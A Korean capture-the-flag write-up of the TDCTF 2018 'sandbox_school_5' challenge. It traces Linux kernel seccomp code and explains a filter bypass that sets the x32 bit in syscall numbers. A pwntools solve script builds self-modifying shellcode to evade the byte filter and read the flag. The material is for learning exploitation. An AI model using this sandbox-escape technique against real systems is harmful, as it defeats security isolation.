---
title: TDCTF 2018 - sandbox_school_5
categories:
 - pwnable
tags: shellcode, seccomp, sandbox, sandbox_escape
---

- Introduction
- Vunlnerability
- Exploit
- slv.py
- 느낀 점
- Reference


## Introduction

TDCTF 2018이 cloud폴더에 있길래..(?) 풀었다. ~~언제 넣어놨지;~~

드림핵에서 봤던 sandbox escape 기법이 생각나서 참고하면서 풀게 되었다.


## Vunlnerability

```c
// gcc sb_school_5.c -o sb5
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/syscall.h>
#include <linux/prctl.h>
#include <linux/filter.h>
#include <linux/seccomp.h>

#include "seccomp-bpf.h"

static int install_syscall_filter(void)
{
	struct sock_filter filter[] = {
		VALIDATE_ARCHITECTURE,
		EXAMINE_SYSCALL,
		DISALLOW_SYSCALL(open),
		DISALLOW_SYSCALL(openat),
		DISALLOW_SYSCALL(fork),
		DISALLOW_SYSCALL(vfork),
		DISALLOW_SYSCALL(clone),
		DISALLOW_SYSCALL(creat),
		DISALLOW_SYSCALL(ptrace),
		DISALLOW_SYSCALL(prctl),
		DISALLOW_SYSCALL(execve),
		DISALLOW_SYSCALL(execveat),
		ALLOW_PROCESS
	};
	struct sock_fprog prog = {
		.len = (unsigned short)(sizeof(filter)/sizeof(filter[0])),
		.filter = filter,
	};

	if (prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0)) {
		perror("prctl(NO_NEW_PRIVS)");
		goto failed;
	}
	if (prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &prog)) {
		perror("prctl(SECCOMP)");
		goto failed;
	}
	return 0;

failed:
	if (errno == EINVAL)
		fprintf(stderr, "SECCOMP_FILTER is not available. :(\n");
	return 1;
}

int main()
{
	void (*sc)();
	unsigned char *shellcode;

	setvbuf(stdout, NULL, _IONBF, 0);
	setvbuf(stdin, NULL, _IONBF, 0);

	shellcode = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (shellcode == MAP_FAILED) {
		printf("[err] Please, let me know this issue (hackability@naver.com)\n");
		return -1;
	}

	printf("[*] Welcome to sandbox school for beginner!\n");
	printf("[*] Put your shellcode as binary stream. I'll ready for your input as read(0, shellcode, 1024)\n");
	printf("[*] Lv   : Troll\n");
	printf("[*] Desc : Now, you can't see me.\n");
	printf("> ");

	alarm(10);

	read(0, shellcode, 1024);

	for(int i=0 ; i<1024-1; i++) {
		if (shellcode[i] == 0x0f && shellcode[i+1] == 0x05) {
			printf("[*] blocked !\n");
			return -1;
		}
	}

	install_syscall_filter();

	sc = (void *)shellcode;
	sc();	
	
	return 0;
}

```

`seccomp`자체에 취약점이 있었다.


## Exploit

먼저 `prctl`함수의 첫 번째 인자에 `PR_SET_SECCOMP`을 넣었을때 동작을 소스코드로 보면

```c
SYSCALL_DEFINE5(prctl, int, option, unsigned long, arg2, unsigned long, arg3,
		unsigned long, arg4, unsigned long, arg5)
{
	struct task_struct *me = current;
	unsigned char comm[sizeof(me->comm)];
	long error;
	error = security_task_prctl(option, arg2, arg3, arg4, arg5);
	if (error != -ENOSYS)
		return error;
	error = 0;
	switch (option) {

	/* snip.. */

	case PR_SET_SECCOMP:
		error = prctl_set_seccomp(arg2, (char __user *)arg3);
		break;

	/* snip.. */

	default:
		error = -EINVAL;
		break;
	}
	return error;
}
```

`prctl_set_seccomp`을 호출하고 인자로 syscall로 넘어온 값들을 넣어준다.


```c
long prctl_set_seccomp(unsigned long seccomp_mode, void __user *filter)
{
	unsigned int op;
	void __user *uargs;
	switch (seccomp_mode) {
	case SECCOMP_MODE_STRICT:
		op = SECCOMP_SET_MODE_STRICT;
		/*
		 * Setting strict mode through prctl always ignored filter,
		 * so make sure it is always NULL here to pass the internal
		 * check in do_seccomp().
		 */
		uargs = NULL;
		break;
	case SECCOMP_MODE_FILTER:
		op = SECCOMP_SET_MODE_FILTER;
		uargs = filter;
		break;
	default:
		return -EINVAL;
	}
	/* prctl interface doesn't have flags, so they are always zero. */
	return do_seccomp(op, 0, uargs);
}
```

`op`에 `SECCOMP_SET_MODE_FILTER`을 넣고 `do_seccomp`에 `op`를 인자로 주고 호출한다.

```c
static long do_seccomp(unsigned int op, unsigned int flags,
		       void __user *uargs)
{
	switch (op) {
	case SECCOMP_SET_MODE_STRICT:
		if (flags != 0 || uargs != NULL)
			return -EINVAL;
		return seccomp_set_mode_strict();
	case SECCOMP_SET_MODE_FILTER:
		return seccomp_set_mode_filter(flags, uargs);
	case SECCOMP_GET_ACTION_AVAIL:
		if (flags != 0)
			return -EINVAL;
		return seccomp_get_action_avail(uargs);
	case SECCOMP_GET_NOTIF_SIZES:
		if (flags != 0)
			return -EINVAL;
		return seccomp_get_notif_sizes(uargs);
	default:
		return -EINVAL;
	}
}
```

`seccomp_set_mode_filter` 호출

```c
static long seccomp_set_mode_filter(unsigned int flags,
				    const char __user *filter)
{
	const unsigned long seccomp_mode = SECCOMP_MODE_FILTER;
	struct seccomp_filter *prepared = NULL;
	long ret = -EINVAL;
	int listener = -1;
	struct file *listener_f = NULL;
	/* Validate flags. */
	if (flags & ~SECCOMP_FILTER_FLAG_MASK)
		return -EINVAL;
	/* Prepare the new filter before holding any locks. */
	prepared = seccomp_prepare_user_filter(filter);
	if (IS_ERR(prepared))
		return PTR_ERR(prepared);
	if (flags & SECCOMP_FILTER_FLAG_NEW_LISTENER) {
		listener = get_unused_fd_flags(O_CLOEXEC);
		if (listener < 0) {
			ret = listener;
			goto out_free;
		}
		listener_f = init_listener(prepared);
		if (IS_ERR(listener_f)) {
			put_unused_fd(listener);
			ret = PTR_ERR(listener_f);
			goto out_free;
		}
	}
	/*
	 * Make sure we cannot change seccomp or nnp state via TSYNC
	 * while another thread is in the middle of calling exec.
	 */
	if (flags & SECCOMP_FILTER_FLAG_TSYNC &&
	    mutex_lock_killable(&current->signal->cred_guard_mutex))
		goto out_put_fd;
	spin_lock_irq(&current->sighand->siglock);
	if (!seccomp_may_assign_mode(seccomp_mode))
		goto out;
	ret = seccomp_attach_filter(flags, prepared);
	if (ret)
		goto out;
	/* Do not free the successfully attached filter. */
	prepared = NULL;
	seccomp_assign_mode(current, seccomp_mode, flags);
out:
	spin_unlock_irq(&current->sighand->siglock);
	if (flags & SECCOMP_FILTER_FLAG_TSYNC)
		mutex_unlock(&current->signal->cred_guard_mutex);
out_put_fd:
	if (flags & SECCOMP_FILTER_FLAG_NEW_LISTENER) {
		if (ret < 0) {
			listener_f->private_data = NULL;
			fput(listener_f);
			put_unused_fd(listener);
		} else {
			fd_install(listener, listener_f);
			ret = listener;
		}
	}
out_free:
	seccomp_filter_free(prepared);
	return ret;
}
```

`seccomp_prepare_user_filter` 호출 후 해당 리턴값을 `seccomp_attach_filter`의 인자로 넣고 호출한다.


```c
/**
 * seccomp_prepare_user_filter - prepares a user-supplied sock_fprog
 * @user_filter: pointer to the user data containing a sock_fprog.
 *
 * Returns 0 on success and non-zero otherwise.
 */
static struct seccomp_filter *
seccomp_prepare_user_filter(const char __user *user_filter)
{
	struct sock_fprog fprog;
	struct seccomp_filter *filter = ERR_PTR(-EFAULT);
#ifdef CONFIG_COMPAT
	if (in_compat_syscall()) {
		struct compat_sock_fprog fprog32;
		if (copy_from_user(&fprog32, user_filter, sizeof(fprog32)))
			goto out;
		fprog.len = fprog32.len;
		fprog.filter = compat_ptr(fprog32.filter);
	} else /* falls through to the if below. */
#endif
	if (copy_from_user(&fprog, user_filter, sizeof(fprog)))
		goto out;
	filter = seccomp_prepare_filter(&fprog);
out:
	return filter;
}
```

`copy_from_user`을 호출해서 유저모드에서 넘어온 `prctl`의 3번째 인자인 `prog`의 값을 `fprog`변수에 담는다.
그 후 `seccomp_prepare_filter`에서 `kzalloc`으로 커널모드 힙영역의 메모리를 제공해 해당 메모리에 `fprogs`의 값을 저장하고 리턴한다.


```c
static long seccomp_attach_filter(unsigned int flags,
				  struct seccomp_filter *filter)
{
	unsigned long total_insns;
	struct seccomp_filter *walker;
	assert_spin_locked(&current->sighand->siglock);
	/* Validate resulting filter length. */
	total_insns = filter->prog->len;
	for (walker = current->seccomp.filter; walker; walker = walker->prev)
		total_insns += walker->prog->len + 4;  /* 4 instr penalty */
	if (total_insns > MAX_INSNS_PER_PATH)
		return -ENOMEM;
	/* If thread sync has been requested, check that it is possible. */
	if (flags & SECCOMP_FILTER_FLAG_TSYNC) {
		int ret;
		ret = seccomp_can_sync_threads();
		if (ret)
			return ret;
	}
	/* Set log flag, if present. */
	if (flags & SECCOMP_FILTER_FLAG_LOG)
		filter->log = true;
	/*
	 * If there is an existing filter, make it the prev and don't drop its
	 * task reference.
	 */
	filter->prev = current->seccomp.filter;
	current->seccomp.filter = filter;
	/* Now that the new filter is in place, synchronize to all threads. */
	if (flags & SECCOMP_FILTER_FLAG_TSYNC)
		seccomp_sync_threads(flags);
	return 0;
}

```

`total_insns`변수로 해당 `filter`를 추가했을때 길이가 `MAX_INSNS_PER_PATH`를 넘는지 확인 후 `current->seccomp.filter`에 추가한다.
이때 새로추가하는 `filter->prev`에 현재 `seccomp.filter`를 넣어준다. stack 느낌으로 젤 앞에 넣어주는 것을 확인할 수 있다.

이렇게 현재 task의 `seccomp.filter`에 filter를 추가하게 된다.

이후 `syscall`이 발생할 경우 `do_syscall_64`가 호출된다.


```c
#ifdef CONFIG_X86_64
_visible void do_syscall_64(unsigned long nr, struct pt_regs *regs)
{
	struct thread_info *ti;
	enter_from_user_mode();
	local_irq_enable();
	ti = current_thread_info();
	if (READ_ONCE(ti->flags) & _TIF_WORK_SYSCALL_ENTRY)
		nr = syscall_trace_enter(regs);
	/*
	 * NB: Native and x32 syscalls are dispatched from the same
	 * table.  The only functional difference is the x32 bit in
	 * regs->orig_ax, which changes the behavior of some syscalls.
	 */
	nr &= __SYSCALL_MASK;
	if (likely(nr < NR_syscalls)) {
		nr = array_index_nospec(nr, NR_syscalls);
		regs->ax = sys_call_table[nr](regs);
	}
	syscall_return_slowpath(regs);
}
#endif
```

`do_syscall_64`에서 `syscall_trace_enter`을 호출

```c
static long syscall_trace_enter(struct pt_regs *regs)
{
	u32 arch = in_ia32_syscall() ? AUDIT_ARCH_I386 : AUDIT_ARCH_X86_64;
	struct thread_info *ti = current_thread_info();
	unsigned long ret = 0;
	bool emulated = false;
	u32 work;
	if (IS_ENABLED(CONFIG_DEBUG_ENTRY))
		BUG_ON(regs != task_pt_regs(current));
	work = READ_ONCE(ti->flags) & _TIF_WORK_SYSCALL_ENTRY;
	if (unlikely(work & _TIF_SYSCALL_EMU))
		emulated = true;
	if ((emulated || (work & _TIF_SYSCALL_TRACE)) &&
	    tracehook_report_syscall_entry(regs))
		return -1L;
	if (emulated)
		return -1L;
#ifdef CONFIG_SECCOMP
	/*
	 * Do seccomp after ptrace, to catch any tracer changes.
	 */
	if (work & _TIF_SECCOMP) {
		struct seccomp_data sd;
		sd.arch = arch;
		sd.nr = regs->orig_ax;
		sd.instruction_pointer = regs->ip;
#ifdef CONFIG_X86_64
		if (arch == AUDIT_ARCH_X86_64) {
			sd.args[0] = regs->di;
			sd.args[1] = regs->si;
			sd.args[2] = regs->dx;
			sd.args[3] = regs->r10;
			sd.args[4] = regs->r8;
			sd.args[5] = regs->r9;
		} else
#endif
		{
			sd.args[0] = regs->bx;
			sd.args[1] = regs->cx;
			sd.args[2] = regs->dx;
			sd.args[3] = regs->si;
			sd.args[4] = regs->di;
			sd.args[5] = regs->bp;
		}
		ret = __secure_computing(&sd);
		if (ret == -1)
			return ret;
	}
#endif
	if (unlikely(test_thread_flag(TIF_SYSCALL_TRACEPOINT)))
		trace_sys_enter(regs, regs->orig_ax);
	do_audit_syscall_entry(regs, arch);
	return ret ?: regs->orig_ax;
}
```

`__secure_computing`에 `seccomp_data` `sd`를 인자로 호출


```c

int __secure_computing(const struct seccomp_data *sd)
{
	int mode = current->seccomp.mode;
	int this_syscall;
	if (IS_ENABLED(CONFIG_CHECKPOINT_RESTORE) &&
	    unlikely(current->ptrace & PT_SUSPEND_SECCOMP))
		return 0;
	this_syscall = sd ? sd->nr :
		syscall_get_nr(current, task_pt_regs(current));
	switch (mode) {
	case SECCOMP_MODE_STRICT:
		__secure_computing_strict(this_syscall);  /* may call do_exit */
		return 0;
	case SECCOMP_MODE_FILTER:
		return __seccomp_filter(this_syscall, sd, false);
	default:
		BUG();
	}
}
```

현재 task에서 `seccomp.mode`를 확인해서 `__seccomp_filter`에 `sd`에서 얻은 `syscall` 번호를 인자로 넣고 호출

```c
static int __seccomp_filter(int this_syscall, const struct seccomp_data *sd,
			    const bool recheck_after_trace)
{
	u32 filter_ret, action;
	struct seccomp_filter *match = NULL;
	int data;
	struct seccomp_data sd_local;
	/*
	 * Make sure that any changes to mode from another thread have
	 * been seen after TIF_SECCOMP was seen.
	 */
	rmb();
	if (!sd) {
		populate_seccomp_data(&sd_local);
		sd = &sd_local;
	}
	filter_ret = seccomp_run_filters(sd, &match);
	data = filter_ret & SECCOMP_RET_DATA;
	action = filter_ret & SECCOMP_RET_ACTION_FULL;
	switch (action) {
	case SECCOMP_RET_ERRNO:
		/* Set low-order bits as an errno, capped at MAX_ERRNO. */
		if (data > MAX_ERRNO)
			data = MAX_ERRNO;
		syscall_set_return_value(current, task_pt_regs(current),
					 -data, 0);
		goto skip;
	case SECCOMP_RET_TRAP:
		/* Show the handler the original registers. */
		syscall_rollback(current, task_pt_regs(current));
		/* Let the filter pass back 16 bits of data. */
		seccomp_send_sigsys(this_syscall, data);
		goto skip;
	case SECCOMP_RET_TRACE:
		/* We've been put in this state by the ptracer already. */
		if (recheck_after_trace)
			return 0;
		/* ENOSYS these calls if there is no tracer attached. */
		if (!ptrace_event_enabled(current, PTRACE_EVENT_SECCOMP)) {
			syscall_set_return_value(current,
						 task_pt_regs(current),
						 -ENOSYS, 0);
			goto skip;
		}
		/* Allow the BPF to provide the event message */
		ptrace_event(PTRACE_EVENT_SECCOMP, data);
		/*
		 * The delivery of a fatal signal during event
		 * notification may silently skip tracer notification,
		 * which could leave us with a potentially unmodified
		 * syscall that the tracer would have liked to have
		 * changed. Since the process is about to die, we just
		 * force the syscall to be skipped and let the signal
		 * kill the process and correctly handle any tracer exit
		 * notifications.
		 */
		if (fatal_signal_pending(current))
			goto skip;
		/* Check if the tracer forced the syscall to be skipped. */
		this_syscall = syscall_get_nr(current, task_pt_regs(current));
		if (this_syscall < 0)
			goto skip;
		/*
		 * Recheck the syscall, since it may have changed. This
		 * intentionally uses a NULL struct seccomp_data to force
		 * a reload of all registers. This does not goto skip since
		 * a skip would have already been reported.
		 */
		if (__seccomp_filter(this_syscall, NULL, true))
			return -1;
		return 0;
	case SECCOMP_RET_USER_NOTIF:
		seccomp_do_user_notification(this_syscall, match, sd);
		goto skip;
	case SECCOMP_RET_LOG:
		seccomp_log(this_syscall, 0, action, true);
		return 0;
	case SECCOMP_RET_ALLOW:
		/*
		 * Note that the "match" filter will always be NULL for
		 * this action since SECCOMP_RET_ALLOW is the starting
		 * state in seccomp_run_filters().
		 */
		return 0;
	case SECCOMP_RET_KILL_THREAD:
	case SECCOMP_RET_KILL_PROCESS:
	default:
		seccomp_log(this_syscall, SIGSYS, action, true);
		/* Dump core only if this is the last remaining thread. */
		if (action == SECCOMP_RET_KILL_PROCESS ||
		    get_nr_threads(current) == 1) {
			kernel_siginfo_t info;
			/* Show the original registers in the dump. */
			syscall_rollback(current, task_pt_regs(current));
			/* Trigger a manual coredump since do_exit skips it. */
			seccomp_init_siginfo(&info, this_syscall, data);
			do_coredump(&info);
		}
		if (action == SECCOMP_RET_KILL_PROCESS)
			do_group_exit(SIGSYS);
		else
			do_exit(SIGSYS);
	}
	unreachable();
skip:
	seccomp_log(this_syscall, 0, action, match ? match->log : false);
	return -1;
}
```

`seccomp_run_filters`의 리턴값을 switch case문으로 확인해서 에러를 리턴할지 정상을 리턴할지 정한다.


```c
static u32 seccomp_run_filters(const struct seccomp_data *sd,
			       struct seccomp_filter **match)
{
	u32 ret = SECCOMP_RET_ALLOW;
	/* Make sure cross-thread synced filter points somewhere sane. */
	struct seccomp_filter *f =
			READ_ONCE(current->seccomp.filter);
	/* Ensure unexpected behavior doesn't result in failing open. */
	if (WARN_ON(f == NULL))
		return SECCOMP_RET_KILL_PROCESS;
	/*
	 * All filters in the list are evaluated and the lowest BPF return
	 * value always takes priority (ignoring the DATA).
	 */
	preempt_disable();
	for (; f; f = f->prev) {
		u32 cur_ret = BPF_PROG_RUN(f->prog, sd);
		if (ACTION_ONLY(cur_ret) < ACTION_ONLY(ret)) {
			ret = cur_ret;
			*match = f;
		}
	}
	preempt_enable();
	return ret;
}

#define READ_ONCE(x) __READ_ONCE(x, 1)

#define __READ_ONCE(x, check)						\
({									\
	union { typeof(x) __val; char __c[1]; } __u;			\
	if (check)							\
		__read_once_size(&(x), __u.__c, sizeof(x));		\
	else								\
		__read_once_size_nocheck(&(x), __u.__c, sizeof(x));	\
	smp_read_barrier_depends(); /* Enforce dependency ordering from x */ \
	__u.__val;							\
})

static __always_inline
void __read_once_size(const volatile void *p, void *res, int size)
{
        switch (size) {                                                 \
        case 1: *(unsigned char *)res = *(volatile unsigned char *)p; break;              \
        case 2: *(unsigned short *)res = *(volatile unsigned short *)p; break;            \
        case 4: *(unsigned int *)res = *(volatile unsigned int *)p; break;            \
        case 8: *(unsigned long long *)res = *(volatile unsigned long long *)p; break;            \
        default:                                                        \
                barrier();                                              \
                __builtin_memcpy((void *)res, (const void *)p, size);   \
                barrier();                                              \
        }                                                               \
}

#define BPF_PROG_RUN(prog, ctx)	({				\
	u32 ret;						\
	cant_sleep();						\
	if (static_branch_unlikely(&bpf_stats_enabled_key)) {	\
		struct bpf_prog_stats *stats;			\
		u64 start = sched_clock();			\
		ret = (*(prog)->bpf_func)(ctx, (prog)->insnsi);	\
		stats = this_cpu_ptr(prog->aux->stats);		\
		u64_stats_update_begin(&stats->syncp);		\
		stats->cnt++;					\
		stats->nsecs += sched_clock() - start;		\
		u64_stats_update_end(&stats->syncp);		\
	} else {						\
		ret = (*(prog)->bpf_func)(ctx, (prog)->insnsi);	\
	}							\
	ret; })

```

`seccomp_run_filters`에서는 for문을 돌아서 `ret = (*(prog)->bpf_func)(ctx, (prog)->insnsi)`을 계속 갱신해주며 리턴할 값을 정한다.

`syscall_trace_enter`로 돌아가면

```c
static long syscall_trace_enter(struct pt_regs *regs)
{
	/* snip */
		ret = __secure_computing(&sd);
		if (ret == -1)
			return ret;
	}
#endif
	if (unlikely(test_thread_flag(TIF_SYSCALL_TRACEPOINT)))
		trace_sys_enter(regs, regs->orig_ax);
	do_audit_syscall_entry(regs, arch);
	return ret ?: regs->orig_ax;
}
```

`__secure_computing`에서 정상적으로 리턴이 되면 `regs->orig_ax`(syscall 번호)를 리턴하고 에러가 나면 -1을 그대로 리턴한다.


다시 `do_syscall_64`로 돌아가서

```c

#ifdef CONFIG_X86_64
_visible void do_syscall_64(unsigned long nr, struct pt_regs *regs)
{
	struct thread_info *ti;
	enter_from_user_mode();
	local_irq_enable();
	ti = current_thread_info();
	if (READ_ONCE(ti->flags) & _TIF_WORK_SYSCALL_ENTRY)
		nr = syscall_trace_enter(regs);
	/*
	 * NB: Native and x32 syscalls are dispatched from the same
	 * table.  The only functional difference is the x32 bit in
	 * regs->orig_ax, which changes the behavior of some syscalls.
	 */
	nr &= __SYSCALL_MASK;
	if (likely(nr < NR_syscalls)) {
		nr = array_index_nospec(nr, NR_syscalls);
		regs->ax = sys_call_table[nr](regs);
	}
	syscall_return_slowpath(regs);
}
#endif

```

여기서 nr이 -1을 리턴받게 되면 밑의 if문에 걸려서 `regs->ax`를 갱신하지 못하게 된다.
정상적으로 리턴받게 되면 if문안의 문장을 실행하게 되면서 `syscall_return_slowpath`를 호출하게 된다.

```c
__visible inline void syscall_return_slowpath(struct pt_regs *regs)
{
	struct thread_info *ti = current_thread_info();
	u32 cached_flags = READ_ONCE(ti->flags);
	CT_WARN_ON(ct_state() != CONTEXT_KERNEL);
	if (IS_ENABLED(CONFIG_PROVE_LOCKING) &&
	    WARN(irqs_disabled(), "syscall %ld left IRQs disabled", regs->orig_ax))
		local_irq_enable();
	rseq_syscall(regs);
	/*
	 * First do one-time work.  If these work items are enabled, we
	 * want to run them exactly once per syscall exit with IRQs on.
	 */
	if (unlikely(cached_flags & SYSCALL_EXIT_WORK_FLAGS))
		syscall_slow_exit_work(regs, cached_flags);
	local_irq_disable();
	prepare_exit_to_usermode(regs);
}
```

사실 여기서 직접 커널 디버깅을 하지 못해서 `syscall_return_slowpath`안에서 검사를 하긴 할것같은데 어디서 진행하는지는 모르겠다.

대충 `seccomp`이 설정되고 syscall을 할때 `seccomp`으로 필터링되는 과정을 따라가보았는데 여기서 문제는 `do_syscall_64`에 있다.

```c
if (READ_ONCE(ti->flags) & _TIF_WORK_SYSCALL_ENTRY)
		nr = syscall_trace_enter(regs);
	/*
	 * NB: Native and x32 syscalls are dispatched from the same
	 * table.  The only functional difference is the x32 bit in
	 * regs->orig_ax, which changes the behavior of some syscalls.
	 */
	nr &= __SYSCALL_MASK;
	if (likely(nr < NR_syscalls)) {
		nr = array_index_nospec(nr, NR_syscalls);
		regs->ax = sys_call_table[nr](regs);
	}
```
여기서 `nr &= __SYSCALL_MASK` 때문에 취약점이 발생한다. `__SYSCALL_MASK`의 값은 ~(0x40000000)이다.

근데 여기서 제일 처음 유저모드에서 syscall을 호출할때 rax값에 (호출하려는 syscall number `or연산` 0x40000000)을 넣어주게 되면 `syscall_trace_enter`의 필터링은 통과하고 `syscall_return_slowpath`을 호출할때는 제대로 된 syscall number가 들어가게 되서 `seccomp`필터링을 우회할 수 있다.

사실 `if(likely(nr < NR_syscalls))`구문을 추가해서 최신 커널버전에서는 취약점 패치를 했다고 생각했는데 취약점과 상관없는 if문이였고 `syscall_trace_enter`의 에러를 탐지하는 정도인것같다.

## slv.py

```python
from pwn import *

p = process('./sb5')

context(arch='amd64', os='linux')

payload = ''
payload += asm(shellcraft.amd64.open('flag',0,0))
payload = payload.replace('\x0f\x05', '\x90\x90')

s = '''
mov rax, 0x2
or rax, 0x40000000
xor word ptr [rip], 0x959f
nop
nop
'''

payload = payload.replace('\x90\x90', asm(s))

payload2 = ''
payload2 += asm(shellcraft.amd64.read('rax','rsp',100))
payload2 += asm(shellcraft.amd64.write(1,'rsp',100))

payload2 = payload2.replace('\x0f\x05', '\x90\x90')

s = '''
xor word ptr [rip], 0x959f
nop
nop
'''
payload2 = payload2.replace('\x90\x90', asm(s))

payload += payload2

p.sendlineafter('> ', payload)

p.interactive()

```

풀이는 `open`, `read`, `write`를 써서 풀긴했는데 `execve`를 해당 취약점으로 call을 하면 실행은 되는데 bad syscall이 뜨면서 프로그램이 죽어버린다.

원인을 알아봐야 될것같다.

문제의 코드

```python
from pwn import *

p = process('./sb5')

context(arch='amd64', os='linux')

payload = ''
payload += asm(shellcraft.amd64.linux.sh())

s = '''
mov rax, 0x3b
or rax, 0x40000000
xor word ptr [rip], 0x959f
nop
nop
'''

p.sendlineafter('> ', payload)

p.interactive()
```


## 느낀 점

역시 커널을 뜯어보고 커널 디버깅도 해야되겠다는걸 다시금 느낀다.
요새 알고리즘을 공부한답시고 공부를 너무 안해서 다시 공부모드로 돌아가야겠다. ~~하지만 말년이라 더 공부안되쥬 ㅋㅋ~~


## Reference
- [https://code.woboq.org/linux/linux/kernel/seccomp.c.html](https://code.woboq.org/linux/linux/kernel/seccomp.c.html)
- [https://code.woboq.org/linux/linux/kernel/sys.c.html#2266](https://code.woboq.org/linux/linux/kernel/sys.c.html#2266)
- [https://code.woboq.org/linux/linux/kernel/seccomp.c.html#prctl_set_seccomp](https://code.woboq.org/linux/linux/kernel/seccomp.c.html#prctl_set_seccomp)
- [https://code.woboq.org/linux/linux/kernel/seccomp.c.html#seccomp_set_mode_strict](https://code.woboq.org/linux/linux/kernel/seccomp.c.html#seccomp_set_mode_strict)
- [https://dreamhack.io/learn/11#31](https://dreamhack.io/learn/11#31)